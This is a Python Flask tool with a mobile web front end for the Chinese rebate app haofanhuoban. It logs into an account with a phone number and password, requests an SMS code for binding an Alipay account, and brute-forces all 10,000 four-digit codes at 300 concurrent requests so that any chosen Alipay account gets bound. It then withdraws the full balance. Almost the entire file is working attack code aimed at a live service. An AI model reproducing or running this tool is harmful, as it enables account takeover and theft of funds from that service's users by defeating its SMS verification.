from typing import Optional,Tuple
import json
import time
import hashlib
import urllib3
import socket
import threading
import warnings
import uuid
import os
import sys
import asyncio
import aiohttp
import requests
from flask import Flask, render_template_string, jsonify, request

# ===================== 全局基础配置（安卓本地适配）=====================
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
socket.setdefaulttimeout(30)
app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
# 安卓本地运行专属配置，禁用调试、开启多线程
app.config['DEBUG'] = False
app.config['THREADED'] = True

# 全局登录状态缓存：多账号切换
login_cache = {
    "mobile": "",
    "token": "",
    "openid": "",
    "is_login": False
}
login_cache_lock = threading.Lock()

# 任务状态字典
task_lock = threading.Lock()
task_dict = {}

# 强化状态字段
TASK_INIT_STATE = {
    "running": False,
    "success": False,
    "success_code": None,
    "key_logs": [],
    "final_log": "",
    "token": None,
    "openid": None,
    "balance": 0.0,
    "mobile": None
}

# ===================== 异步验码配置（300并发，安卓适配）=====================
ASYNC_VERIFY_CONCURRENT = 300
# 安卓本地异步适配
asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy() if sys.platform == 'win32' else asyncio.DefaultEventLoopPolicy())

# ===================== 接口/固定配置（实测可用）=====================
LOGIN_API = "https://api.haofanhuoban.com/api/v1/userAgent/auth/passwordLogin"
SEND_SMS_API = "https://api.haofanhuoban.com/api/v1/userAgent/send/bindAlipaySms"
BIND_ALIPAY_API = "https://api.haofanhuoban.com/api/v1/userAgent/balance/userAlipayBind"
QUERY_BALANCE_API = "https://api.haofanhuoban.com/api/v1/userAgent/user/info"
WITHDRAW_API = "https://api.haofanhuoban.com/api/v1/userAgent/balance/applyWithdrawal"
CLIENT_ADD = "lsII1AXmYoapUbyWxXgx6w=="
OS_TYPE = "1"
APP_ID = "1"
VERSION = "2.1.0"
MODEL = "IN2010"
BRAND = "OnePlus"
USER_AGENT = "okhttp/4.9.0"
FIXED_TRACE_ID = "896ba4b6-48ab-a009-7b0eef354192"

# 网络超时配置（适配手机网络）
LOGIN_TIMEOUT = 8
SMS_TIMEOUT = 8
BIND_TIMEOUT = 5
QUERY_TIMEOUT = 5
WITHDRAW_TIMEOUT = 5

# ===================== 核心工具函数（安卓本地优化）=====================
def create_task_session() -> requests.Session:
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=100, pool_maxsize=100, max_retries=1, pool_block=False
    )
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.verify = False
    session.stream = False
    session.allow_redirects = False
    session.headers.update({"Connection": "keep-alive", "Keep-Alive": "timeout=30, max=1000"})
    # 安卓本地IPV6适配
    try:
        requests.packages.urllib3.util.connection.HAS_IPV6 = False
    except:
        pass
    return session

def add_task_log(task_id: str, content: str):
    log = f"[{time.strftime('%H:%M:%S')}] {content}"
    with task_lock:
        if task_id not in task_dict:
            task_dict[task_id] = TASK_INIT_STATE.copy()
        task_dict[task_id]["key_logs"].append(log)
        if len(task_dict[task_id]["key_logs"]) > 30:
            task_dict[task_id]["key_logs"].pop(0)

def gen_md5_sign(phone: str, timestamp: int) -> str:
    return hashlib.md5(f"mobile={phone}&signTimestamp={timestamp}".encode()).hexdigest()

# 生成唯一TaskID
def gen_task_id():
    return str(uuid.uuid4()).replace("-", "")[:16]

# ===================== 同步接口（无前置操作，自动校验登录）=====================
def password_login(task_id: str, mobile: str, password: str, session: requests.Session = None) -> tuple[bool, str, Optional[tuple]]:
    if not session:
        session = create_task_session()
    add_task_log(task_id, f"【登录】开始验证账号：{mobile}")
    headers = {
        "host": "api.haofanhuoban.com",
        "authorization": "",
        "openid": "",
        "clientadd": CLIENT_ADD,
        "requesttraceid": FIXED_TRACE_ID,
        "os": OS_TYPE,
        "appid": APP_ID,
        "version": VERSION,
        "model": MODEL,
        "brand": BRAND,
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": USER_AGENT
    }
    data = f"mobile={mobile}&password={password}&wxUid=&tbUid="
    headers["content-length"] = str(len(data.encode("utf-8")))
    try:
        resp = session.post(LOGIN_API, headers=headers, data=data, timeout=LOGIN_TIMEOUT)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json.get("code") == 200 and resp_json.get("status") == "success":
                token = resp_json["data"]["accessToken"].replace("Bearer ", "")
                openid = resp_json["data"]["openId"]
                add_task_log(task_id, "【登录成功】已获取Token/OpenID，持久化状态")
                # 全局缓存登录状态
                with login_cache_lock:
                    login_cache["mobile"] = mobile
                    login_cache["token"] = token
                    login_cache["openid"] = openid
                    login_cache["is_login"] = True
                # 同步到任务字典
                with task_lock:
                    task_dict[task_id]["token"] = token
                    task_dict[task_id]["openid"] = openid
                    task_dict[task_id]["mobile"] = mobile
                return True, "登录成功", (token, openid)
            err_msg = resp_json.get("message", "账号或密码错误")
            add_task_log(task_id, f"【登录失败】{err_msg}")
            return False, err_msg, None
        add_task_log(task_id, f"【登录失败】接口返回异常，状态码：{resp.status_code}")
        return False, "接口返回异常", None
    except Exception as e:
        err_msg = f"网络异常：{str(e)[:50]}"
        add_task_log(task_id, f"【登录异常】{err_msg}")
        return False, err_msg, None

def send_bind_sms(task_id: str, mobile: str, token: str, openid: str, session: requests.Session = None) -> tuple[bool, str]:
    if not session:
        session = create_task_session()
    add_task_log(task_id, f"【发送验证码】向{mobile}发起请求")
    headers = {
        "host": "api.haofanhuoban.com",
        "authorization": f"Bearer {token}",
        "openid": openid,
        "clientadd": CLIENT_ADD,
        "requesttraceid": FIXED_TRACE_ID,
        "os": OS_TYPE,
        "appid": APP_ID,
        "version": VERSION,
        "model": MODEL,
        "brand": BRAND,
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": USER_AGENT
    }
    ts = int(time.time())
    data = f"mobile={mobile}&signTimestamp={ts}&sign={gen_md5_sign(mobile, ts)}"
    headers["content-length"] = str(len(data.encode("utf-8")))
    try:
        resp = session.post(SEND_SMS_API, headers=headers, data=data, timeout=SMS_TIMEOUT)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json.get("code") == 200:
                add_task_log(task_id, "【验证码发送成功】开始300并发极速验码")
                return True, "验证码发送成功"
            err_msg = resp_json.get("message", "验证码发送失败")
            add_task_log(task_id, f"【验证码发送失败】{err_msg}")
            return False, err_msg
        return False, f"接口返回异常，状态码：{resp.status_code}"
    except Exception as e:
        err_msg = f"网络异常：{str(e)[:50]}"
        add_task_log(task_id, f"【验证码发送异常】{err_msg}")
        return False, err_msg

def query_balance(task_id: str, mobile: str = "", pwd: str = "", token: str = None, openid: str = None, session: requests.Session = None) -> tuple[bool, str, float]:
    # 优先用缓存的token/openid，无则自动尝试登录
    with login_cache_lock:
        use_token = token if token else login_cache["token"]
        use_openid = openid if openid else login_cache["openid"]
    if not session:
        session = create_task_session()
    # 无有效登录状态，且传了账号密码则自动登录
    if not (use_token and use_openid) and mobile and pwd:
        login_ok, login_msg, login_res = password_login(task_id, mobile, pwd, session)
        if not login_ok:
            add_task_log(task_id, f"【余额查询失败】{login_msg}")
            return False, login_msg, 0.0
        use_token, use_openid = login_res
    elif not (use_token and use_openid):
        err_msg = "无有效登录状态，请先输入账号密码"
        add_task_log(task_id, f"【余额查询失败】{err_msg}")
        return False, err_msg, 0.0
    # 开始查询余额
    add_task_log(task_id, "【余额查询】开始获取账户余额")
    headers = {
        "host": "api.haofanhuoban.com",
        "authorization": f"Bearer {use_token}",
        "openid": use_openid,
        "clientadd": CLIENT_ADD,
        "requesttraceid": FIXED_TRACE_ID,
        "os": OS_TYPE,
        "appid": APP_ID,
        "version": VERSION,
        "model": MODEL,
        "brand": BRAND,
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": USER_AGENT
    }
    try:
        resp = session.post(QUERY_BALANCE_API, headers=headers, data={}, timeout=QUERY_TIMEOUT)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json.get("code") == 200 and resp_json.get("status") == "success":
                balance = float(resp_json["data"].get("balance", resp_json["data"].get("amount", 0.0)))
                add_task_log(task_id, f"【余额查询成功】当前余额：{balance:.2f}元")
                with task_lock:
                    task_dict[task_id]["balance"] = balance
                return True, "查询成功", balance
            err_msg = resp_json.get("message", "余额查询失败")
            add_task_log(task_id, f"【余额查询失败】{err_msg}")
            return False, err_msg, 0.0
        return False, f"接口返回异常，状态码：{resp.status_code}", 0.0
    except Exception as e:
        err_msg = f"网络异常：{str(e)[:50]}"
        add_task_log(task_id, f"【余额查询异常】{err_msg}")
        return False, err_msg, 0.0

def withdraw_all(task_id: str, mobile: str = "", pwd: str = "", token: str = None, openid: str = None, session: requests.Session = None) -> tuple[bool, str, float]:
    # 优先用缓存的token/openid，无则自动尝试登录
    with login_cache_lock:
        use_token = token if token else login_cache["token"]
        use_openid = openid if openid else login_cache["openid"]
    if not session:
        session = create_task_session()
    # 无有效登录状态，且传了账号密码则自动登录
    if not (use_token and use_openid) and mobile and pwd:
        login_ok, login_msg, login_res = password_login(task_id, mobile, pwd, session)
        if not login_ok:
            add_task_log(task_id, f"【提现失败】{login_msg}")
            return False, login_msg, 0.0
        use_token, use_openid = login_res
    elif not (use_token and use_openid):
        err_msg = "无有效登录状态，请先输入账号密码"
        add_task_log(task_id, f"【提现失败】{err_msg}")
        return False, err_msg, 0.0
    # 无余额则先查询
    with task_lock:
        if task_id not in task_dict:
            task_dict[task_id] = TASK_INIT_STATE.copy()
        current_balance = task_dict[task_id]["balance"] if task_dict[task_id]["balance"] > 0 else 0.0
    if current_balance <= 0:
        query_ok, query_msg, query_bal = query_balance(task_id, mobile, pwd, use_token, use_openid, session)
        if not query_ok:
            return False, query_msg, 0.0
        current_balance = query_bal
    if current_balance <= 0:
        err_msg = "账户余额为0，无需提现"
        add_task_log(task_id, f"【提现失败】{err_msg}")
        return False, err_msg, 0.0
    # 开始提现
    add_task_log(task_id, f"【全部提现】发起请求：{current_balance:.2f}元")
    headers = {
        "host": "api.haofanhuoban.com",
        "authorization": f"Bearer {use_token}",
        "openid": use_openid,
        "clientadd": CLIENT_ADD,
        "requesttraceid": FIXED_TRACE_ID,
        "os": OS_TYPE,
        "appid": APP_ID,
        "version": VERSION,
        "model": MODEL,
        "brand": BRAND,
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": USER_AGENT
    }
    data = f"amount={current_balance:.2f}&type=1"
    try:
        resp = session.post(WITHDRAW_API, headers=headers, data=data, timeout=WITHDRAW_TIMEOUT)
        if resp.status_code == 200:
            resp_json = resp.json()
            if resp_json.get("status") == "success" and resp_json.get("code") == 200:
                add_task_log(task_id, f"【提现成功】已发起{current_balance:.2f}元提现，等待到账")
                with task_lock:
                    task_dict[task_id]["final_log"] = f"提现成功！已发起{current_balance:.2f}元提现"
                    task_dict[task_id]["balance"] = 0.0
                return True, f"提现成功！已发起{current_balance:.2f}元提现，请等待到账", 0.0
            err_msg = resp_json.get("message", "提现申请被拒绝")
            add_task_log(task_id, f"【提现失败】{err_msg}")
            return False, err_msg, current_balance
        return False, f"接口返回异常，状态码：{resp.status_code}", current_balance
    except Exception as e:
        err_msg = f"网络异常：{str(e)[:50]}"
        add_task_log(task_id, f"【提现异常】{err_msg}")
        return False, err_msg, current_balance

# ===================== 异步验码（300并发，安卓本地稳定版）=====================
async def bind_alipay_async(
    task_id: str, code: str, mobile: str, real_name: str, ali_account: str,
    token: str, openid: str, session: aiohttp.ClientSession, sema: asyncio.Semaphore
):
    async with sema:
        with task_lock:
            if task_dict[task_id]["success"]:
                return True
        headers = {
            "host": "api.haofanhuoban.com",
            "authorization": f"Bearer {token}",
            "openid": openid,
            "clientadd": CLIENT_ADD,
            "requesttraceid": FIXED_TRACE_ID,
            "os": OS_TYPE,
            "appid": APP_ID,
            "version": VERSION,
            "model": MODEL,
            "brand": BRAND,
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": USER_AGENT
        }
        data = f"mobile={mobile}&code={code}&realName={real_name}&account={ali_account}"
        headers["content-length"] = str(len(data.encode("utf-8")))
        try:
            async with session.post(
                BIND_ALIPAY_API, headers=headers, data=data, timeout=BIND_TIMEOUT, ssl=False
            ) as resp:
                if resp.status != 200:
                    return False
                resp_text = await resp.text()
                try:
                    resp_json = json.loads(resp_text)
                    cond1 = resp_json.get("status") == "success" and resp_json.get("code") == 200
                    cond2 = resp_json.get("code") == 200 and resp_json.get("message") in ["成功", "ok"]
                    cond3 = resp_json.get("message") == "绑定成功" and resp.status == 200
                    if cond1 or cond2 or cond3:
                        with task_lock:
                            task_dict[task_id]["success"] = True
                            task_dict[task_id]["success_code"] = code
                            task_dict[task_id]["final_log"] = f"绑定成功！正确验证码：{code}"
                        add_task_log(task_id, f"🎉 绑定成功！匹配到正确验证码：{code}")
                        return True
                except json.JSONDecodeError:
                    return False
        except:
            pass
    return False

async def async_verify_main(
    task_id: str, mobile: str, real_name: str, ali_account: str,
    token: str, openid: str
):
    # 安卓本地aiohttp适配
    connector = aiohttp.TCPConnector(ssl=False, limit=0, ttl_dns_cache=300, enable_cleanup_closed=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        sema = asyncio.Semaphore(ASYNC_VERIFY_CONCURRENT)
        tasks = []
        for num in range(10000):
            with task_lock:
                if task_dict[task_id]["success"]:
                    break
            code = f"{num:04d}"
            tasks.append(
                bind_alipay_async(
                    task_id, code, mobile, real_name, ali_account,
                    token, openid, session, sema
                )
            )
        # 异步执行，适配安卓性能
        for task in asyncio.as_completed(tasks):
            with task_lock:
                if task_dict[task_id]["success"]:
                    break
            await task

def run_async_verify(task_id, mobile, real_name, ali_account, token, openid):
    # 安卓本地异步线程适配
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(async_verify_main(task_id, mobile, real_name, ali_account, token, openid))
    except:
        pass
    finally:
        with task_lock:
            if task_id in task_dict:
                task_dict[task_id]["running"] = False

# ===================== 绑定任务（无前置，自动登录，安卓稳定）=====================
def start_bind_task(task_id: str, mobile: str, pwd: str, real_name: str, ali_account: str):
    with task_lock:
        if task_id not in task_dict:
            task_dict[task_id] = TASK_INIT_STATE.copy()
        if task_dict[task_id]["running"]:
            add_task_log(task_id, "【绑定失败】绑定任务已在运行，请勿重复点击")
            return
        task_dict[task_id]["running"] = True
        task_dict[task_id]["mobile"] = mobile
    session = create_task_session()
    try:
        # 无登录则自动登录
        login_ok, login_msg, login_res = password_login(task_id, mobile, pwd, session)
        if not login_ok:
            with task_lock:
                task_dict[task_id]["running"] = False
                task_dict[task_id]["final_log"] = f"任务终止：{login_msg}"
            return
        token, openid = login_res
        # 发送验证码
        sms_ok, sms_msg = send_bind_sms(task_id, mobile, token, openid, session)
        if not sms_ok:
            with task_lock:
                task_dict[task_id]["running"] = False
                task_dict[task_id]["final_log"] = f"任务终止：{sms_msg}"
            return
        # 异步验码（守护线程，适配安卓）
        threading.Thread(
            target=run_async_verify,
            args=(task_id, mobile, real_name, ali_account, token, openid),
            daemon=True
        ).start()
    except Exception as e:
        err_msg = f"任务异常：{str(e)[:50]}"
        add_task_log(task_id, f"【绑定异常】{err_msg}")
        with task_lock:
            task_dict[task_id]["running"] = False
            task_dict[task_id]["final_log"] = err_msg
    finally:
        session.close()
        # 安卓本地缓存清理
        threading.Timer(86400, lambda tid: task_dict.pop(tid, None) if tid in task_dict else None, args=[task_id]).start()

# ===================== Flask接口（纯安卓本地，无跨域）=====================
@app.route("/login", methods=["POST"])
def api_login():
    data = request.get_json()
    mobile = data.get("mobile", "").strip()
    pwd = data.get("pwd", "").strip()
    task_id = data.get("task_id", gen_task_id())
    if not mobile or not pwd:
        return jsonify({"ok": False, "msg": "请输入手机号和密码！", "task_id": task_id})
    login_ok, login_msg, _ = password_login(task_id, mobile, pwd)
    return jsonify({"ok": login_ok, "msg": login_msg, "task_id": task_id})

@app.route("/start_bind", methods=["POST"])
def api_start_bind():
    data = request.get_json()
    mobile = data.get("mobile", "").strip()
    pwd = data.get("pwd", "").strip()
    aliName = data.get("aliName", "").strip()
    aliAccount = data.get("aliAccount", "").strip()
    task_id = data.get("task_id", gen_task_id())
    if not all([mobile, pwd, aliName, aliAccount]):
        return jsonify({"ok": False, "msg": "请填写所有账号和支付宝信息！", "task_id": task_id})
    # 启动绑定任务
    threading.Thread(target=start_bind_task, args=(task_id, mobile, pwd, aliName, aliAccount), daemon=True).start()
    return jsonify({"ok": True, "msg": "绑定任务已启动，正在极速处理...", "task_id": task_id})

@app.route("/query_balance", methods=["POST"])
def api_query_balance():
    data = request.get_json()
    mobile = data.get("mobile", "").strip()
    pwd = data.get("pwd", "").strip()
    task_id = data.get("task_id", gen_task_id())
    query_ok, query_msg, balance = query_balance(task_id, mobile, pwd)
    return jsonify({"ok": query_ok, "msg": query_msg, "balance": round(balance, 2), "task_id": task_id})

@app.route("/withdraw_all", methods=["POST"])
def api_withdraw_all():
    data = request.get_json()
    mobile = data.get("mobile", "").strip()
    pwd = data.get("pwd", "").strip()
    task_id = data.get("task_id", gen_task_id())
    withdraw_ok, withdraw_msg, balance = withdraw_all(task_id, mobile, pwd)
    return jsonify({"ok": withdraw_ok, "msg": withdraw_msg, "balance": round(balance, 2), "task_id": task_id})

@app.route("/get_state")
def api_state():
    task_id = request.args.get("task_id", gen_task_id())
    with login_cache_lock:
        is_login = login_cache["is_login"]
        login_mobile = login_cache["mobile"]
    with task_lock:
        if task_id not in task_dict:
            task_dict[task_id] = TASK_INIT_STATE.copy()
        task_data = task_dict[task_id].copy()
        key_logs = "<br>".join(task_data["key_logs"]) if task_data["key_logs"] else "[系统提示] 所有按钮均可直接点击，无需前置操作！"
    return jsonify({
        "is_login": is_login,
        "login_mobile": login_mobile,
        "success_code": task_data["success_code"],
        "key_logs": key_logs,
        "balance": round(task_data["balance"], 2),
        "task_id": task_id
    })

# ===================== 前端页面（纯手机适配，所有按钮常亮）=====================
@app.route("/")
def index():
    html = '''
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<title>好饭助手</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Microsoft YaHei",sans-serif;}
body{background:#f5f7fa;padding:10px;width:100vw;margin:0 auto;overflow-x:hidden;min-height:100vh;}
.container{background:#fff;border-radius:16px;padding:20px;box-shadow:0 0 20px rgba(0,0,0,0.08);width:100%;max-width:450px;margin:0 auto;}
h2{text-align:center;color:#165dff;margin-bottom:20px;font-weight:700;font-size:22px;}
.login-state{text-align:center;color:#00b42a;font-size:14px;font-weight:600;margin-bottom:15px;padding:10px;background:#e8fef7;border-radius:10px;display:none;}
.task-id{text-align:center;color:#666;font-size:12px;margin-bottom:15px;padding:8px;background:#f8f9fa;border-radius:8px;word-break:break-all;}
.form-item{margin-bottom:15px;position:relative;width:100%;}
label{font-size:14px;color:#333;margin-bottom:8px;display:block;font-weight:500;}
input{width:100%;padding:15px 12px;border:1px solid #e5e7eb;border-radius:10px;font-size:16px;}
input:focus{outline:none;border-color:#165dff;box-shadow:0 0 0 3px rgba(22,93,255,0.1);}
.password-toggle{position:absolute;right:15px;top:42px;cursor:pointer;color:#999;font-size:18px;user-select:none;}
/* 所有按钮永久高亮，无禁用！手机端点击反馈优化 */
.btn-box{display:flex;gap:12px;margin:20px 0;flex-wrap:wrap;}
.btn{flex:1;padding:16px 0;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;min-width:30%;color:#fff;transition:all 0.2s;}
.btn-login{background:#00b42a;width:100%;font-size:17px;}
.btn-bind{background:#165dff;}
.btn-query{background:#36cfc9;}
.btn-withdraw{background:#ff7d00;}
/* 手机端点击反馈 */
.btn:active{opacity:0.8;transform:scale(0.98);}
.loading{text-align:center;color:#165dff;margin:15px 0;display:none;font-size:15px;}
.log-box{height:200px;background:#f8f9fa;border-radius:10px;padding:12px;overflow-y:auto;font-size:13px;line-height:1.7;margin-top:20px;border:1px solid #eee;}
.balance-box{display:flex;align-items:center;justify-content:center;margin:20px 0;padding:20px;background:#f0f7ff;border-radius:12px;width:100%;display:none;}
.balance-label{font-size:17px;color:#666;margin-right:10px;font-weight:500;}
.balance-value{font-size:28px;color:#165dff;font-weight:700;margin:0 5px;}
/* 弹窗样式（手机端全屏适配） */
.modal{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.85);display:flex;justify-content:center;align-items:center;z-index:9999;padding:20px;display:none;}
.modal-content{background:#fff;border-radius:16px;padding:30px 25px;text-align:center;width:100%;max-width:380px;}
.modal-icon{font-size:60px;margin-bottom:20px;}
.modal-title{font-size:24px;color:#1d2129;margin-bottom:15px;font-weight:700;}
.modal-code{font-size:36px;font-weight:900;color:#165dff;margin:20px 0;letter-spacing:4px;}
.modal-desc{font-size:16px;color:#666;margin-bottom:25px;line-height:1.6;}
.modal-btn{padding:15px 30px;background:#165dff;color:#fff;border:none;border-radius:12px;font-size:17px;cursor:pointer;margin-top:5px;width:100%;transition:all 0.2s;}
.modal-btn:active{opacity:0.8;}
/* 小屏手机适配 */
@media (max-width: 375px) {
    body{padding:8px;}
    .container{padding:15px;}
    .log-box{height:180px;}
    .btn{padding:14px 0;font-size:15px;}
    .balance-value{font-size:24px;}
}
</style>
</head>
<body>
<div class="container">
  <h2>🚀 好饭助手</h2>
  <div class="task-id" id="taskId">当前任务ID：<span style='color:#165dff;font-weight:600;'>初始化中...</span></div>
  <div class="login-state" id="loginState">✅ 已登录：<span id="loginMobile">未登录</span></div>
  
  <div class="form-item">
    <label>好饭登录手机号</label>
    <input id="mobile" placeholder="请输入手机号" autocomplete="off" type="tel">
  </div>
  <div class="form-item">
    <label>好饭登录密码</label>
    <input type="password" id="pwd" placeholder="请输入密码" autocomplete="off">
    <span class="password-toggle" onclick="togglePassword('pwd')">👁️</span>
  </div>
  <div class="form-item">
    <label>支付宝实名（与收款号一致）</label>
    <input id="aliName" placeholder="请输入实名" autocomplete="off">
  </div>
  <div class="form-item">
    <label>支付宝收款号（手机号/邮箱）</label>
    <input id="aliAccount" placeholder="请输入收款号" autocomplete="off">
  </div>
  
  <!-- 所有按钮永久高亮，无禁用 -->
  <div class="btn-box">
    <button class="btn btn-login" id="loginBtn">登录/换号登录</button>
  </div>
  <div class="btn-box">
    <button class="btn btn-bind" id="bindBtn">开始绑定</button>
    <button class="btn btn-query" id="queryBtn">查询余额</button>
    <button class="btn btn-withdraw" id="withdrawBtn">全部提现</button>
  </div>
  
  <div class="loading" id="loading">正在处理中...</div>
  
  <div class="balance-box" id="balanceBox">
    <span class="balance-label">当前余额：</span>
    <span class="balance-value" id="balanceValue">0.00</span>
    <span class="balance-label">元</span>
  </div>
  
  <div class="log-box" id="keyLogs">[系统提示] 所有按钮均可直接点击，无需前置操作！</div>
</div>

<!-- 登录成功弹窗 -->
<div class="modal" id="loginSuccessModal">
  <div class="modal-content">
    <div class="modal-icon" style="color:#00b42a;">✅</div>
    <div class="modal-title">登录成功！</div>
    <div class="modal-desc">已保存登录状态，可直接点击绑定/查询/提现</div>
    <button class="modal-btn" onclick="closeModal('loginSuccessModal')">确定</button>
  </div>
</div>

<!-- 操作失败弹窗 -->
<div class="modal" id="failModal">
  <div class="modal-content">
    <div class="modal-icon" style="color:#f53f3f;">❌</div>
    <div class="modal-title">操作失败</div>
    <div class="modal-desc" id="failMsg">请检查账号信息或网络状态</div>
    <button class="modal-btn" onclick="closeModal('failModal')">确定</button>
  </div>
</div>

<!-- 绑定成功弹窗 -->
<div class="modal" id="bindSuccessModal">
  <div class="modal-content">
    <div class="modal-icon" style="color:#00b42a;">✅</div>
    <div class="modal-title">绑定成功！</div>
    <div class="modal-desc">已完成支付宝绑定，可直接查询/提现</div>
    <div class="modal-code" id="succCode">8888</div>
    <div class="modal-desc">匹配到的正确验证码</div>
    <button class="modal-btn" onclick="closeModal('bindSuccessModal')">确定</button>
  </div>
</div>

<!-- 提现结果弹窗 -->
<div class="modal" id="withdrawModal">
  <div class="modal-content">
    <div class="modal-icon" id="withdrawIcon" style="color:#00b42a;">✅</div>
    <div class="modal-title" id="withdrawTitle">提现成功！</div>
    <div class="modal-desc" id="withdrawMsg">已发起提现，请等待系统到账</div>
    <button class="modal-btn" onclick="closeModal('withdrawModal')">确定</button>
  </div>
</div>

<script>
// 全局变量
let currentTaskId = "";
// 页面加载初始化
window.onload = function() {
    getState();
    // 每3秒刷新状态，手机端低耗
    setInterval(getState, 3000);
};
// 密码显隐
function togglePassword(inputId) {
  const input = document.getElementById(inputId);
  const toggle = input.nextElementSibling;
  input.type = input.type === "password" ? "text" : "password";
  toggle.textContent = input.type === "password" ? "👁️" : "🙈";
}
// 关闭弹窗
function closeModal(modalId) {
  document.getElementById(modalId).style.display = "none";
}
// 显示弹窗
function showModal(modalId, msg = "", title = "", isSuccess = true) {
  if (modalId === 'failModal') {
    document.getElementById("failMsg").innerText = msg;
  } else if (modalId === 'withdrawModal') {
    document.getElementById("withdrawIcon").style.color = isSuccess ? "#00b42a" : "#f53f3f";
    document.getElementById("withdrawIcon").innerText = isSuccess ? "✅" : "❌";
    document.getElementById("withdrawTitle").innerText = title;
    document.getElementById("withdrawMsg").innerText = msg;
  } else if (modalId === 'bindSuccessModal' && msg) {
    document.getElementById("succCode").innerText = msg;
  }
  document.getElementById(modalId).style.display = "flex";
}
// 显示/隐藏加载
function showLoading(show) {
  document.getElementById("loading").style.display = show ? "block" : "none";
}
// 获取当前状态（日志/登录/余额）
function getState() {
  fetch(`/get_state?task_id=${currentTaskId}`, {cache: "no-cache"})
  .then(res => res.json())
  .then(data => {
    currentTaskId = data.task_id;
    document.getElementById("taskId").innerHTML = `当前任务ID：<span style='color:#165dff;font-weight:600;'>${currentTaskId}</span>`;
    document.getElementById("keyLogs").innerHTML = data.key_logs;
    // 日志自动滚动到底部
    const logBox = document.getElementById("keyLogs");
    logBox.scrollTop = logBox.scrollHeight;
    // 更新登录状态
    if (data.is_login && data.login_mobile) {
      document.getElementById("loginState").style.display = "block";
      document.getElementById("loginMobile").innerText = data.login_mobile;
    } else {
      document.getElementById("loginState").style.display = "none";
    }
    // 更新余额
    if (data.balance > 0) {
      document.getElementById("balanceBox").style.display = "flex";
      document.getElementById("balanceValue").innerText = data.balance.toFixed(2);
    }
  }).catch(err => {});
}
// 通用请求方法（手机端网络适配）
function requestApi(api, data) {
  showLoading(true);
  return fetch(api, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({...data, task_id: currentTaskId}),
    cache: "no-cache",
    timeout: 15000
  }).then(res => res.json()).finally(() => showLoading(false));
}
// 登录/换号
document.getElementById("loginBtn").onclick = function() {
  const mobile = document.getElementById("mobile").value.trim();
  const pwd = document.getElementById("pwd").value.trim();
  requestApi("/login", {mobile, pwd})
  .then(data => {
    currentTaskId = data.task_id;
    if (data.ok) {
      showModal("loginSuccessModal");
    } else {
      showModal("failModal", data.msg);
    }
    getState();
  }).catch(err => {
    showModal("failModal", "网络请求失败，请检查网络");
    showLoading(false);
  });
};
// 开始绑定
document.getElementById("bindBtn").onclick = function() {
  const mobile = document.getElementById("mobile").value.trim();
  const pwd = document.getElementById("pwd").value.trim();
  const aliName = document.getElementById("aliName").value.trim();
  const aliAccount = document.getElementById("aliAccount").value.trim();
  requestApi("/start_bind", {mobile, pwd, aliName, aliAccount})
  .then(data => {
    currentTaskId = data.task_id;
    if (!data.ok) {
      showModal("failModal", data.msg);
      getState();
      return;
    }
    // 轮询绑定状态
    let checkTimes = 0;
    let checkBind = setInterval(() => {
      checkTimes++;
      fetch(`/get_state?task_id=${currentTaskId}`, {cache: "no-cache"})
      .then(res => res.json())
      .then(data => {
        if (data.success_code) {
          showModal("bindSuccessModal", data.success_code);
          clearInterval(checkBind);
        }
        // 超时自动停止轮询
        if (checkTimes >= 60) {
          clearInterval(checkBind);
        }
      });
    }, 1000);
    getState();
  }).catch(err => {
    showModal("failModal", "网络请求失败，请检查网络");
    showLoading(false);
  });
};
// 查询余额
document.getElementById("queryBtn").onclick = function() {
  const mobile = document.getElementById("mobile").value.trim();
  const pwd = document.getElementById("pwd").value.trim();
  requestApi("/query_balance", {mobile, pwd})
  .then(data => {
    currentTaskId = data.task_id;
    if (data.ok) {
      document.getElementById("balanceBox").style.display = "flex";
      document.getElementById("balanceValue").innerText = data.balance.toFixed(2);
    } else {
      showModal("failModal", data.msg);
    }
    getState();
  }).catch(err => {
    showModal("failModal", "网络请求失败，请检查网络");
    showLoading(false);
  });
};
// 全部提现
document.getElementById("withdrawBtn").onclick = function() {
  const mobile = document.getElementById("mobile").value.trim();
  const pwd = document.getElementById("pwd").value.trim();
  requestApi("/withdraw_all", {mobile, pwd})
  .then(data => {
    currentTaskId = data.task_id;
    if (data.ok) {
      showModal("withdrawModal", data.msg, "提现成功！", true);
      document.getElementById("balanceValue").innerText = data.balance.toFixed(2);
    } else {
      showModal("withdrawModal", data.msg, "提现失败", false);
    }
    getState();
  }).catch(err => {
    showModal("failModal", "网络请求失败，请检查网络");
    showLoading(false);
  });
};
</script>
</body>
</html>
'''
    return render_template_string(html)

# ===================== 安卓本地启动（核心：127.0.0.1适配）=====================
if __name__ == "__main__":
    # 纯安卓本地运行，固定127.0.0.1，自动适配端口
    app.run(
        host="127.0.0.1",
        port=8080,
        debug=False,
        use_reloader=False,
        threaded=True
    )